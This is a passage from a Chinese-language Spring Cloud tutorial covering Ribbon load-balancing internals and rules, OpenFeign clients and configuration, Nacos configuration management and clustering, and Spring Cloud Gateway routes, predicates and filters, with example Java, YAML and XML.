                                             |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ①都支持服务注册和服务拉取<br>②都支持服务提供者心跳方式做健康检测 | ①Nacos支持服务端主动检测提供者状态，临时实例采用心跳模式，非临时实例采用主动检测模式 <br/>②临时实例心跳不正常会被剔除，非临时实例则不会被剔除<br/>③Nacos支持服务列表变更的消息推送模式，服务列表更新更及时<br/>④Nacos集群默认采用AP方式，当集群中存在非临时实例时，采用CP模式；Eureka采用AP方式 |\n\n# 4.负载均衡-Ribbon\n\n## ①负载均衡原理\n\nSpringCloud底层利用Ribbon来实现负载均衡功能\n\n![](https://img.jwt1399.top/img/202209211319306.png)\n\n我们发出的请求明明是`http://userservice/user/1`，怎么变成了`http://localhost:8081/user/1`的呢？\n\n> 显然有人帮我们根据service名称，获取到了服务实例的ip和端口。它就是`LoadBalancerInterceptor`，这个类会在对RestTemplate的请求进行拦截，然后从Eureka根据服务id获取服务列表，随后利用负载均衡算法得到真实的服务地址信息，替换服务id。我们进行源码跟踪：\n\n### ❶LoadBalancerIntercepor\n\n![](https://img.jwt1399.top/img/202209211333296.png)\n\n可以看到这里的`intercept`方法，拦截了用户的HttpRequest请求，然后做了几件事：\n\n- `request.getURI()`：获取请求uri，本例中就是 `http://user-service/user/8`\n- `originalUri.getHost()`：获取uri路径的主机名，其实就是服务id，`user-service`\n- `this.loadBalancer.execute()`：处理服务id，和用户请求。\n\n这里的`this.loadBalancer`是`LoadBalancerClient`类型，我们继续跟入execute方法：\n\n### ❷LoadBalancerClient\n\n![](https://img.jwt1399.top/img/202209211333636.png)\n\n- `getLoadBalancer(serviceId)`：根据服务id获取ILoadBalancer，而ILoadBalancer会拿着服务id去eureka中获取服务列表并保存起来。\n- `getServer(loadBalancer)`：利用内置的负载均衡算法，从服务列表中选择一个。本例中，可以看到获取了8082端口的服务\n\n放行后，再次访问并跟踪，发现获取的是8081，果然实现了负载均衡。\n\n ![](https://img.jwt1399.top/img/202209211333458.png)\n\n### ❸负载均衡策略IRule\n\n在刚才的代码中，可以看到获取服务使通过一个`getServer`方法来做负载均衡:\n\n![](https://img.jwt1399.top/img/202209211333458.png)\n\n我们继续跟入：\n\n![](https://img.jwt1399.top/img/202209211337777.png)\n\n继续跟踪源码chooseServer方法，发现这么一段代码：\n\n| ![](https://img.jwt1399.top/img/202209211337640.png) | ![](https://img.jwt1399.top/img/202209211337661.png) |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n\n这里的rule默认值是一个`RoundRobinRule`，看类的介绍：\n\n ![](https://img.jwt1399.top/img/202209211339083.png)\n\n这不就是轮询的意思嘛。到这里，整个负载均衡的流程我们就清楚了。\n\n### ❹总结\n\nRibbon的底层采用了一个拦截器，拦截了RestTemplate发出的请求，对地址做了修改。用一幅图来总结一下：\n\n![](https://img.jwt1399.top/img/202209211340322.png)\n\n基本流程如下：\n\n- 1.拦截我们的**RestTemplate**请求`http://userservice/user/1`\n- 2.**RibbonLoadBalancerClient**会从请求url中获取服务名称，也就是userservice\n- 3.**DynamicServerListLoadBalancer**根据userservice到eureka拉取服务列表\n- 4.**eureka-server**返回列表，localhost:8081、localhost:8082\n- 5.**IRule**利用内置负载均衡规则，从列表中选择一个，例如localhost:8081\n- 6.**RibbonLoadBalancerClient**修改请求地址，用localhost:8081替代userservice，得到`http://localhost:8081/user/1`，发起真实请求\n\n## ②负载均衡策略\n\n负载均衡的规则都定义在IRule接口中，而IRule有很多不同的实现类：\n\n![](https://img.jwt1399.top/img/202209211344655.png)\n\n**不同规则的含义如下：**\n\n| **内置负载均衡规则类**    | **规则描述**                                                 |\n| ------------------------- | ------------------------------------------------------------ |\n| RoundRobinRule            | 简单轮询服务列表来选择服务器。它是Ribbon默认的负载均衡规则。 |\n| AvailabilityFilteringRule | 对以下两种服务器进行忽略：   （1）在默认情况下，这台服务器如果3次连接失败，这台服务器就会被设置为“短路”状态。短路状态将持续30秒，如果再次连接失败，短路的持续时间就会几何级地增加。  （2）并发数过高的服务器。如果一个服务器的并发连接数过高，配置了AvailabilityFilteringRule规则的客户端也会将其忽略。并发连接数的上限，可以由客户端的\\<clientName>.\\<clientConfigNameSpace>.ActiveConnectionsLimit属性进行配置。 |\n| WeightedResponseTimeRule  | 为每一个服务器赋予一个权重值。服务器响应时间越长，这个服务器的权重就越小。这个规则会随机选择服务器，这个权重值会影响服务器的选择。 |\n| **ZoneAvoidanceRule**     | 以区域可用的服务器为基础进行服务器的选择。使用Zone对服务器进行分类，这个Zone可以理解为一个机房、一个机架等。而后再对Zone内的多个服务做轮询。 |\n| BestAvailableRule         | 忽略那些短路的服务器，并选择并发数较低的服务器。             |\n| RandomRule                | 随机选择一个可用的服务器。                                   |\n| RetryRule                 | 重试机制的选择逻辑                                           |\n\n默认的实现就是ZoneAvoidanceRule，是一种轮询方案\n\n**自定义负载均衡策略**\n\n通过定义IRule实现可以修改负载均衡规则，有两种方式：\n\n- 1.全局配置：在order-service中的OrderApplication类中，定义一个新的IRule\n\n```java\n@Bean\npublic IRule randomRule(){\n    return new RandomRule();\n}\n```\n\n- 2.单个配置：在order-service的application.yml文件中，添加新的配置也可以修改规则：\n\n```yaml\nuserservice: # 给某个微服务配置负载均衡规则，这里是userservice服务\n  ribbon:\n    NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule # 负载均衡规则 \n```\n\n> **注意**，一般用默认的负载均衡规则，不做修改。\n\n## ③饥饿加载\n\nRibbon默认是采用懒加载，即第一次访问时才会去创建LoadBalanceClient，请求时间会很长。\n\n而饥饿加载则会在项目启动时创建，降低第一次访问的耗时，通过下面配置开启饥饿加载：\n\n```yaml\nribbon:\n  eager-load:\n    enabled: true\n    clients: userservice\n```\n\n# 5.服务远程调用②\n\n## ②OpenFeign\n\n> 前面利用RestTemplate发起远程调用的代码\n>\n> ```java\n> String url = \"http://localhost:8081/user/\" + order.getUserId();\n> User user = restTemplate.getForObject(url, User.class);\n> ```\n>\n> 存在下面的问题：\n>\n> - 代码可读性差，编程体验不统一\n>\n> - 参数复杂URL难以维护\n\nOpenFeign是一个声明式的http客户端，其作用就是帮助我们优雅的实现http请求的发送，解决上面提到的问题。\n\n### ❶使用\n\n**步骤一：引入依赖**\n\n在order-service服务的pom文件中引入openfeign的依赖\n\n```xml\n<dependency>\n    <groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter-openfeign</artifactId>\n</dependency>\n```\n\n使用 openfeign 依赖 ribbon，但是最新版的 openfeign 移除了ribbon ，因此如果单独使用openfeign需要引入ribbon，并进行配置。如果配合 eureka 或 nacos 则不用\n\n```xml\n<dependency>\n  <groupId>org.springframework.cloud</groupId>\n  <artifactId>spring-cloud-starter-netflix-ribbon</artifactId>\n</dependency>\n```\n\n```yaml\n# 这个userservice是加了@FeignClient注解的类的name\nuserservice:\n  ribbon:\n    # 服务提供者的地址，不是服务注册中心的地址\n    listOfServers: http://localhost:8081\n```\n\n**步骤二：添加注解**\n\n在order-service的启动类添加注解开启openfeign的功能：\n\n```java\n@EnableFeignClients //开启feign\n@MapperScan(\"cn.xxxx.order.mapper\")\n@SpringBootApplication\npublic class OrderApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(OrderApplication.class, args);\n    }\n}\n```\n\n**步骤三：编写Feign的客户端**\n\n在order-service中新建一个接口，内容如下：\n\n```java\n@FeignClient(\"userservice\")\npublic interface UserClient {\n    @GetMapping(\"/user/{id}\")\n    User findById(@PathVariable(\"id\") Long id);\n}\n```\n\n这个客户端主要是基于SpringMVC的注解来声明远程调用的信息，比如：\n\n- 服务名称：userservice\n- 请求方式：GET\n- 请求路径：/user/{id}\n- 请求参数：Long id\n- 返回值类型：User\n\n这样，Feign就可以帮助我们发送http请求，无需自己使用RestTemplate来发送了。\n\n**步骤四：实现远程调用**\n\n修改order-service中的OrderService类中的queryOrderById方法，使用Feign客户端代替RestTemplate：\n\n```java\n@Service\npublic class OrderService {\n\n    @Autowired\n    private OrderMapper orderMapper;\n  \n    @Autowired\n    private UserClient userClient \n\n    public Order queryOrderById(Long orderId) {\n        // 1.查询订单\n        Order order = orderMapper.findById(orderId);\n        // 2.利用Feign发起http请求，查询用户\n        User user = userClient.findById(order.getUserId());\n        // 3.存入order\n        order.setUser(user);\n        // 4.返回\n        return order;\n    }\n}\n```\n\n![实现过程](https://img.jwt1399.top/img/202209202105075.png)\n\n**总结**\n\n使用Feign的步骤：\n\n- ① 引入依赖\n\n- ② 添加@EnableFeignClients注解\n\n- ③ 编写FeignClient接口\n\n- ④ 使用FeignClient中定义的方法代替RestTemplate\n\n### ❷配置\n\nFeign可以支持很多的自定义配置，如下表所示：\n\n| 类型                   | 作用             | 说明                                                   |\n| ---------------------- | ---------------- | ------------------------------------------------------ |\n| **feign.Logger.Level** | 修改日志级别     | 包含四种不同的级别：NONE、BASIC、HEADERS、FULL         |\n| feign.codec.Decoder    | 响应结果的解析器 | http远程调用的结果做解析，例如解析json字符串为java对象 |\n| feign.codec.Encoder    | 请求参数编码     | 将请求参数编码，便于通过http请求发送                   |\n| feign. Contract        | 支持的注解格式   | 默认是SpringMVC的注解                                  |\n| feign. Retryer         | 失败重试机制     | 请求失败的重试机制，默认是没有，不过会使用Ribbon的重试 |\n\n日志的级别分为四种：\n\n- NONE：不记录任何日志信息，这是默认值。\n- BASIC：仅记录请求的方法，URL以及响应状态码和执行时间（推荐使用）\n- HEADERS：在BASIC的基础上，额外记录了请求和响应的头信息\n- FULL：记录所有请求和响应的明细，包括头信息、请求体、元数据。\n\n一般情况下，默认值就能满足我们使用，如果要自定义时，可以通过**修改配置文件**或者创建**自定义@Bean覆盖默认Bean**\n\n**修改配置文件方式**\n\n- 针对单个服务：\n\n```yaml\nfeign:  \n  client:\n    config: \n      userservice: # 针对某个微服务的配置\n        loggerLevel: FULL #  日志级别 \n```\n\n- 针对所有服务：\n\n```yaml\nfeign:  \n  client:\n    config: \n      default: # 这里用default就是全局配置，如果是写服务名称，则是针对某个微服务的配置\n        loggerLevel: FULL #  日志级别 \n```\n\n**自定义Bean覆盖**\n\n也可以基于Java代码来修改日志级别，先声明一个类，然后声明一个Logger.Level的对象：\n\n```java\npublic class DefaultFeignConfiguration  {\n    @Bean\n    public Logger.Level feignLogLevel(){\n        return Logger.Level.BASIC; // 日志级别为BASIC\n    }\n}\n```\n\n如果要**全局生效**，将其放到启动类的@EnableFeignClients这个注解中：\n\n```java\n@EnableFeignClients(defaultConfiguration = DefaultFeignConfiguration.class) \n```\n\n如果是**局部生效**，则把它放到对应的@FeignClient这个注解中：\n\n```java\n@FeignClient(value = \"userservice\", configuration = DefaultFeignConfiguration.class) \n```\n\n### ❸优化\n\nFeign底层发起http请求，依赖于其它的框架。其底层客户端实现包括：\n\n- URLConnection：默认实现，不支持连接池\n\n- Apache HttpClient ：支持连接池\n\n- OKHttp：支持连接池\n\n因此提高Feign的性能主要手段就是使用**连接池**代替默认的URLConnection。这里我们用Apache的HttpClient来演示。\n\n**步骤一：**引入依赖\n\n在order-service的pom文件中引入Apache的HttpClient依赖：\n\n```xml\n<!--httpClient的依赖 -->\n<dependency>\n    <groupId>io.github.openfeign</groupId>\n    <artifactId>feign-httpclient</artifactId>\n</dependency>\n```\n\n**步骤二：**配置连接池\n\n在order-service的application.yml中添加配置：\n\n```yaml\nfeign:\n  client:\n    config:\n      default: # default全局的配置\n        loggerLevel: BASIC # 日志级别，BASIC就是基本的请求和响应信息\n  httpclient:\n    enabled: true # 开启feign对HttpClient的支持\n    max-connections: 200 # 最大的连接数\n    max-connections-per-route: 50 # 每个路径的最大连接数\n```\n\n### ❹最佳实践\n\n所谓最近实践，就是使用过程中总结的经验，最好的一种使用方式。仔细可以发现，Feign的客户端与服务提供者的controller代码非常相似：\n\n| UserClient                                           | UserController                                               |\n| ---------------------------------------------------- | ------------------------------------------------------------ |\n| ![](https://img.jwt1399.top/img/202209241117530.png) | <img src=\"https://img.jwt1399.top/img/202209241117602.png\" style=\"zoom: 67%;\" /> |\n\n有没有一种办法简化这种重复的代码编写呢？\n\n**方案一：继承方式**\n\n一样的代码可以通过继承来共享：\n\n- 1.定义一个API接口，利用定义方法，并基于SpringMVC注解做声明。\n- 2.Feign客户端和Controller都集成该接口\n\n![](https://img.jwt1399.top/img/202209241120933.png)优点：\n\n- 简单\n- 实现了代码共享\n\n缺点：\n\n- 服务提供方、服务消费方紧耦合\n\n- 参数列表中的注解映射并不会继承，因此Controller中必须再次声明方法、参数列表、注解\n\n**方案二：抽取方式**\n\n将Feign的Client抽取为独立模块，并且把接口有关的POJO、默认的Feign配置都放到这个模块中，提供给所有消费者使用。\n\n例如，将UserClient、User、Feign的默认配置都抽取到一个feign-api包中，所有微服务引用该依赖包，即可直接使用。\n\n![](https://img.jwt1399.top/img/202209241123914.png)\n\n**步骤一：抽取**\n\n首先创建一个module，命名为feign-api，在feign-api中然后引入feign的starter依赖\n\n```xml\n<dependency>\n    <groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter-openfeign</artifactId>\n</dependency>\n```\n\n然后，order-service中编写的UserClient、User、DefaultFeignConfiguration都复制到feign-api项目中\n\n![](https://img.jwt1399.top/img/202209241125595.png)\n\n\n\n**步骤二：在order-service中使用feign-api**\n\n首先，删除order-service中的UserClient、User、DefaultFeignConfiguration等类或接口。在order-service的pom文件中中引入feign-api的依赖：\n\n```xml\n<dependency>\n    <groupId>cn.itcast.demo</groupId>\n    <artifactId>feign-api</artifactId>\n    <version>1.0</version>\n</dependency>\n```\n\n修改order-service中的所有与上述三个组件有关的导包部分，改成导入feign-api中的包\n\n**步骤三：重启测试**\n\n重启后，发现服务报错了：\n\n![](../images/SpringCloud-实用篇/image-20210714205623048.png)\n\n这是因为UserClient现在在cn.itcast.feign.clients包下，而order-service的@EnableFeignClients注解是在cn.itcast.order包下，不在同一个包，无法扫描到UserClient。\n\n**步骤四：解决扫描包问题**\n\n方式一：指定Feign应该扫描的包：\n\n```java\n@EnableFeignClients(basePackages = \"cn.itcast.feign.clients\")\n```\n\n方式二：指定需要加载的Client接口：\n\n```java\n@EnableFeignClients(clients = {UserClient.class})\n```\n\n# 6.统一配置管理\n\n## ①Nacos\n\nNacos除了可以做注册中心，同样可以做配置管理来使用。当微服务部署的实例越来越多，达到数十、数百时，逐个修改微服务配置就会让人抓狂，而且很容易出错。我们需要一种统一配置管理方案，可以集中管理所有实例的配置。\n\n![](https://img.jwt1399.top/img/202209241704284.png)\n\n\n\nNacos一方面可以将配置集中管理，另一方可以在配置变更时，及时通知微服务，实现配置的热更新。\n\n### ❶统一配置管理\n\n**步骤一：在nacos中添加配置文件**\n\n| 1.在Nacos中添加配置信息                              | 2.在弹出表单中填写配置信息                           |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202209241700314.png) | ![](https://img.jwt1399.top/img/202209241700595.png) |\n\n**步骤二：从微服务拉取配置**\n\n微服务要拉取nacos中管理的配置，并且与本地的application.yml配置合并，才能完成项目启动。\n\n但如果尚未读取application.yml，又如何得知nacos地址呢？\n\n因此spring引入了一种新的配置文件：`bootstrap.yaml`文件，会在application.yml之前被读取，流程如下：\n\n| 传统读取配置      | ![](https://img.jwt1399.top/img/202209241707016.png) |\n| ----------------- | ---------------------------------------------------- |\n| **nacos管理配置** | ![](https://img.jwt1399.top/img/202209241707835.png) |\n\n1.引入Nacos的配置管理客户端依赖\n\n```xml\n<!--nacos配置管理依赖-->\n<dependency>\n    <groupId>com.alibaba.cloud</groupId>\n    <artifactId>spring-cloud-starter-alibaba-nacos-config</artifactId>\n</dependency>\n```\n\n2.在userservice的resource目录添加一个bootstrap.yml文件，这个文件是引导文件，优先级高于application.yml：\n\n```yaml\nspring:\n  application:\n    name: userservice # 服务名称\n  profiles:\n    active: dev #开发环境，这里是dev \n  cloud:\n    nacos:\n      server-addr: localhost:8848 # Nacos地址\n      config:\n        file-extension: yaml # 文件后缀名\n```\n\n这里会根据spring.cloud.nacos.server-addr获取nacos地址，再根据\n\n`${spring.application.name}-${spring.profiles.active}.${spring.cloud.nacos.config.file-extension}`作为文件id，来读取配置。本例中，就是去读取`userservice-dev.yaml`\n\n![](https://img.jwt1399.top/img/202209241709238.png)\n\n3.在user-service中的UserController中添加业务逻辑，读取pattern.dateformat配置\n\n```java\n@Slf4j\n@RestController\n@RequestMapping(\"/user\")\npublic class UserController {\n\n    @Value(\"${pattern.dateformat}\")\n    private String dateformat;\n\n    @GetMapping(\"now\")\n    public String now(){\n        return LocalDateTime.now().format(DateTimeFormatter.ofPattern(dateformat));\n    }\n}\n```\n\n访问页面`http://127.0.0.1:8081/user/now`即可看到时间\n\n**总结：**将配置交给Nacos管理的步骤\n\n- ①在Nacos中添加配置文件\n\n- ②在微服务中引入nacos的config依赖\n\n- ③在微服务中添加bootstrap.yml，配置nacos地址、当前环境、服务名称、文件后缀名。\n\n### ❷配置热更新\n\n我们最终的目的，是修改nacos中的配置后，微服务无需重启即可让配置生效，也就是**配置热更新**。\n\n要实现配置热更新，可以使用两种方式：\n\n**方式一：通过 Spring Cloud 原生注解 `@RefreshScope` 实现配置自动更新**\n\n```java\n@RefreshScope //添加注解\n@Slf4j\n@RestController\n@RequestMapping(\"/user\")\npublic class UserController {\n\n    @Value(\"${pattern.dateformat}\")\n    private String dateformat;\n\n    @GetMapping(\"now\")\n    public String now(){\n        return LocalDateTime.now().format(DateTimeFormatter.ofPattern(dateformat));\n    }\n}\n```\n\n**方式二：使用@ConfigurationProperties注解代替@Value注解**\n\n在user-service服务中，添加一个类，读取patterrn.dateformat属性：\n\n```java\n@Component\n@Data\n@ConfigurationProperties(prefix = \"pattern\")\npublic class PatternProperties {\n    private String dateformat;\n}\n```\n\n在UserController中使用这个类代替@Value：\n\n```java\n@Slf4j\n@RestController\n@RequestMapping(\"/user\")\npublic class UserController {\n\n    @Autowired\n    private PatternProperties patternProperties;\n\n    @GetMapping(\"now\")\n    public String now(){\n        return LocalDateTime.now().format(DateTimeFormatter.ofPattern(patternProperties.getDateformat()));\n    }\n}\n```\n\n### ❸配置共享\n\n其实微服务启动时，会去nacos读取多个配置文件，例如：\n\n- `[spring.application.name]-[spring.profiles.active].yaml`，例如：userservice-dev.yaml\n\n- `[spring.application.name].yaml`，例如：userservice.yaml\n\n而`[spring.application.name].yaml`不包含环境，因此可以被多个环境共享。\n\n例如：在nacos配置3个文件：userservice-dev.yaml、userservice-test.yaml、userservice.yaml\n\nUserApplication(8081)使用的profile是dev，UserApplication2(8082)使用的profile是test，运行后不管是dev，还是test环境，都读取到了userservice.yaml中属性的值。\n\n但是当nacos和服务本地同时出现相同属性时，优先级有高低之分：userservice-dev.yaml > userservice.yaml > application.yml\n\n![](https://img.jwt1399.top/img/202209241736075.png)\n\n**多服务共享配置**\n\n不同微服务之间可以共享配置文件，通过下面的两种方式来指定\n\n方式一：\n\n```yaml\nspring:\n  application:\n    name: userservice # 服务名称\n  profiles:\n    active: dev #开发环境，这里是dev\n  cloud:\n    nacos:\n      server-addr: localhost:8848 # Nacos地址\n      config:\n        file-extension: yaml # 文件后缀名\n        shared-configs: # 多微服务间共享的配置列表\u000b\n         - dataId: common.yaml # 要共享的配置文件id\n```\n\n方式二：\n\n```yaml\nspring:\n  application:\n    name: userservice # 服务名称\n  profiles:\n    active: dev #开发环境，这里是dev\n  cloud:\n    nacos:\n      server-addr: localhost:8848 # Nacos地址\n      config:\n        file-extension: yaml # 文件后缀名\n        extends-configs: # 多微服务间共享的配置列表\n         - dataId: extend.yaml # 要共享的配置文件id\n```\n\n多种配置的优先级：\n\n![](https://img.jwt1399.top/img/202209241748244.png)\n\n### ❹搭建Nacos集群\n\n![](https://img.jwt1399.top/img/202209242331548.png)\n\n| 节点   | ip            | port |\n| ------ | ------------- | ---- |\n| nacos1 | 192.168.150.1 | 8845 |\n| nacos2 | 192.168.150.1 | 8846 |\n| nacos3 | 192.168.150.1 | 8847 |\n\n#### ⓵初始化数据库\n\nNacos默认数据存储在内嵌数据库Derby中，不属于生产可用的数据库。官方推荐的最佳实践是使用带有主从的高可用数据库集群。这里我们以单点的数据库为例。\n\n首先新建一个数据库，命名为nacos，而后导入官方提供的SQL：[nacos/schema.sql ](https://github.com/alibaba/nacos/blob/master/distribution/conf/schema.sql)\n\n#### ⓶部署配置nacos\n\n下载nacos后，进入nacos的conf目录，修改配置文件cluster.conf.example，重命名为cluster.conf\n\n然后添加内容：\n\n```\n127.0.0.1:8845\n127.0.0.1.8846\n127.0.0.1.8847\n```\n\n然后修改application.properties文件，添加数据库配置\n\n```properties\nspring.datasource.platform=mysql\n\ndb.num=1\n\ndb.url.0=jdbc:mysql://127.0.0.1:3306/nacos?characterEncoding=utf8&connectTimeout=1000&socketTimeout=3000&autoReconnect=true&useUnicode=true&useSSL=false&serverTimezone=UTC\ndb.user.0=root\ndb.password.0=root\n```\n\n#### ⓷启动nacos集群\n\n将nacos文件夹复制三份，分别命名为：nacos1、nacos2、nacos3；然后分别修改三个文件夹中的application.properties\n\nnacos1:\n\n```properties\nserver.port=8845\n```\n\nnacos2:\n\n```properties\nserver.port=8846\n```\n\nnacos3:\n\n```properties\nserver.port=8847\n```\n\n然后分别启动三个nacos节点：`startup.cmd`\n\n#### ⓸nginx反向代理\n\n下载nginx后，修改conf/nginx.conf文件，配置如下：\n\n```json\nupstream nacos-cluster {\n  server 127.0.0.1:8845;\n\tserver 127.0.0.1:8846;\n\tserver 127.0.0.1:8847;\n}\n\nserver {\n    listen       80;\n    server_name  localhost;\n\n    location /nacos {\n        proxy_pass http://nacos-cluster;\n    }\n}\n```\n\n而后在浏览器访问：`http://localhost/nacos`即可。\n\n代码中application.yml文件配置如下：\n\n```yaml\nspring:\n  cloud:\n    nacos:\n      server-addr: localhost:80 # Nacos地址\n```\n\n#### ⓹优化\n\n- 实际部署时，需要给做反向代理的nginx服务器设置一个域名，这样后续如果有服务器迁移，nacos的客户端也无需更改配置\n\n- Nacos的各个节点应该部署到多个不同服务器，做好容灾和隔离\n\n# 7.统一网关路由\n\n## ①简介\n\nSpring Cloud Gateway 是 Spring Cloud 的一个全新项目，该项目是基于 Spring 5.0，Spring Boot 2.0 和 Project Reactor 等响应式编程和事件流技术开发的网关，它旨在为微服务架构提供一种简单有效的统一的 API 路由管理方式。\n\nGateway网关是我们服务的守门神，所有微服务的统一入口。网关的**核心功能特性**：\n\n- 路由和负载均衡\n  - 一切请求都必须先经过gateway，但网关不处理业务，而是根据某种规则，把请求转发到某个微服务，这个过程叫做路由。当然路由的目标服务有多个时，还需要做负载均衡。\n- 权限控制\n  - 网关作为微服务入口，需要校验用户是是否有请求资格，如果没有则进行拦截。\n- 限流\n  - 当请求流量过高时，在网关中按照下流的微服务能够接受的速度来放行请求，避免服务压力过大。\n\n\n<img src=\"../images/SpringCloud-实用篇/image-20220925101634632.png\" alt=\"架构图\" style=\"zoom:50%;\" />\n\n在SpringCloud中网关的实现包括两种：\n\n- gateway\n- zuul\n\nZuul是基于Servlet的实现，属于阻塞式编程。而SpringCloudGateway则是基于Spring5中提供的WebFlux，属于响应式编程的实现，具备更好的性能。\n\n## ②快速入门\n\n下面，我们就演示下网关的基本路由功能。基本步骤如下：\n\n1. 创建新模块，引入网关依赖\n2. 编写启动类\n3. 编写基础配置和路由规则\n4. 启动网关服务进行测试\n\n### ❶创建新模块，引入网关依赖\n\n创建服务：\n\n![](https://img.jwt1399.top/img/202209251033539.png)\n\n引入依赖：\n\n```xml\n<!--网关-->\n<dependency>\n    <groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter-gateway</artifactId>\n</dependency>\n<!--nacos服务发现依赖-->\n<dependency>\n    <groupId>com.alibaba.cloud</groupId>\n    <artifactId>spring-cloud-starter-alibaba-nacos-discovery</artifactId>\n</dependency>\n```\n\n### ❷编写启动类\n\n```java\n@SpringBootApplication\npublic class GatewayApplication {\n\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(GatewayApplication.class, args);\n\t}\n}\n```\n\n### ❸编写基础配置和路由规则\n\n创建application.yml文件，内容如下：\n\n```yaml\nserver:\n  port: 10010 # 网关端口\nspring:\n  application:\n    name: gateway # 服务名称\n  cloud:\n    nacos:\n      server-addr: localhost:8848 # nacos地址\n    gateway:\n      routes: # 网关路由配置\n        - id: user-service # 路由id，自定义，只要唯一即可\n          # uri: http://127.0.0.1:8081 # 路由的目标地址 http就是固定地址\n          uri: lb://userservice # 路由的目标地址 lb就是负载均衡，后面跟服务名称\n          predicates: # 路由断言，也就是判断请求是否符合路由规则的条件\n            - Path=/user/** # 这个是按照路径匹配，只要以/user/开头就符合要求\n```\n\n我们将符合`Path` 规则的一切请求，都代理到 `uri`参数指定的地址。\n\n本例中，我们将 `/user/**`开头的请求，代理到`lb://userservice`，lb是负载均衡，根据服务名拉取服务列表，实现负载均衡。\n\n### ❹启动网关服务进行测试\n\n启动网关，访问`http://localhost:10010/user/1`时，符合`/user/**`规则，请求转发到uri：`http://userservice/user/1`，得到了结果：\n\n![](https://img.jwt1399.top/img/202209251054663.png)\n\n整个访问的流程如下：\n\n![](https://img.jwt1399.top/img/202209251055650.png)\n\n### ❺总结\n\n网关搭建步骤：\n\n1. 创建项目，引入nacos服务发现和gateway依赖\n\n2. 配置application.yml，包括服务基本信息、nacos地址、路由\n\n路由配置包括：\n\n1. 路由id：路由的唯一标示\n\n2. 路由目标（uri）：路由的目标地址，http代表固定地址，lb代表根据服务名负载均衡\n\n3. 路由断言（predicates）：判断路由的规则\n\n4. 路由过滤器（filters）：对请求或响应做处理\n\n## ③断言工厂\n\n我们在配置文件中写的断言规则只是字符串，这些字符串会被Predicate Factory读取并处理，转变为路由判断的条件\n\n例如`Path=/user/**`是按照路径匹配，这个规则是由\n\n`org.springframework.cloud.gateway.handler.predicate.PathRoutePredicateFactory`类来\n\n处理的，像这样的断言工厂在SpringCloudGateway还有十几个:\n\n| **名称**   | **说明**                       | **示例**                                                     |\n| ---------- | ------------------------------ | ------------------------------------------------------------ |\n| After      | 是某个时间点后的请求           | -  After=2037-01-20T17:42:47.789-07:00[America/Denver]       |\n| Before     | 是某个时间点之前的请求         | -  Before=2031-04-13T15:14:47.433+08:00[Asia/Shanghai]       |\n| Between    | 是某两个时间点之前的请求       | -  Between=2037-01-20T17:42:47.789-07:00[America/Denver],  2037-01-21T17:42:47.789-07:00[America/Denver] |\n| Cookie     | 请求必须包含某些cookie         | - Cookie=chocolate, ch.p                                     |\n| Header     | 请求必须包含某些header         | - Header=X-Request-Id, \\d+                                   |\n| Host       | 请求必须是访问某个host（域名） | -  Host=**.somehost.org,**.anotherhost.org                   |\n| Method     | 请求方式必须是指定方式         | - Method=GET,POST                                            |\n| Path       | 请求路径必须符合指定规则       | - Path=/red/{segment},/blue/**                               |\n| Query      | 请求参数必须包含指定参数       | - Query=name, Jack或者-  Query=name                          |\n| RemoteAddr | 请求者的ip必须是指定范围       | - RemoteAddr=192.168.1.1/24                                  |\n| Weight     | 权重处理                       |                                                              |\n\n我们只需要掌握Path这种路由工程就可以了。\n\n## ④过滤工厂\n\nGatewayFilter是网关中提供的一种过滤器，可以对进入网关的请求和微服务返回的响应做处理：\n\n![](https://img.jwt1399.top/img/202209251101960.png)\n\n\n\n### ❶路由过滤器的种类\n\nSpring提供了31种不同的路由过滤器工厂。例如：\n\n| **名称**             | **说明**                     |\n| -------------------- | ---------------------------- |\n| AddRequestHeader     | 给当前请求添加一个请求头     |\n| RemoveRequestHeader  | 移除请求中的一个请求头       |\n| AddResponseHeader    | 给响应结果中添加一个响应头   |\n| RemoveResponseHeader | 从响应结果中移除有一个响应头 |\n| RequestRateLimiter   | 限制请求的流量               |\n| ......               | ......                       |\n\n### ❷响应头过滤器\n\n下面我们以AddResponseHeader 为例来讲解。\n\n> **需求**：给所有进入userservice的请求添加一个请求头：Truth=This is a test !\n\n只需要修改gateway服务的application.yml文件，添加路由过滤即可：\n\n```yaml\nspring:\n  cloud:\n    gateway:\n      routes:\n      - id: user-service \n        uri: lb://userservice \n        predicates: \n        - Path=/user/** \n      - id: order-service\n        uri: lb://orderservice\n        predicates:\n        - Path=/order/**\n        filters: # 过滤器\n        - AddResponseHeader=Truth, This is a test! # 添加请求头\n```\n\n当前过滤器写在userservice路由下，因此仅仅对访问userservice的请求有效。\n\n![](https://img.jwt1399.top/img/202209251112506.png)\n\n### ❸默认过滤器\n\n如果要对所有的路由都生效，则可以将过滤器工厂写到default下。格式如下：\n\n```yaml\nspring:\n  cloud:\n    gateway:\n      routes:\n      - id: user-service \n        uri: lb://userservice \n        predicates: \n        - Path=/user/**\n      default-filters: # 默认过滤项\n      - AddResponseHeader=Truth, This is a test! \n```\n\n### ❹总结\n\n过滤器的作用是什么？\n\n- ① 对路由的请求或响应做加工处理，比如添加请求头\n\n- ② 配置在路由下的过滤器只对当前路由的请求生效\n\ndefaultFilters的作用是什么？\n\n- ① 对所有路由都生效的过滤器\n\n## ⑤全局过滤器\n\n上一节学习的过滤器，网关提供了31种，但每一种过滤器的作用都是固定的。如果我们希望拦截请求，做自己的业务逻辑则没办法实现。\n\n### ❶全局过滤器作用\n\n全局过滤器的作用也是处理一切进入网关的请求和微服务响应，与GatewayFilter的作用一样。区别在于GatewayFilter通过配置定义，处理逻辑是固定的；而GlobalFilter的逻辑需要自己写代码实现。\n\n定义方式是实现GlobalFilter接口。\n\n```java\npublic interface GlobalFilter {\n    /**\n     *  处理当前请求，有必要的话通过{@link GatewayFilterChain}将请求交给下一个过滤器处理\n     *\n     * @param exchange 请求上下文，里面可以获取Request、Response等信息\n     * @param chain 用来把请求委托给下一个过滤器 \n     * @return {@code Mono<Void>} 返回标示当前过滤器业务结束\n     */\n    Mono<Void> filter(ServerWebExchange exchange, 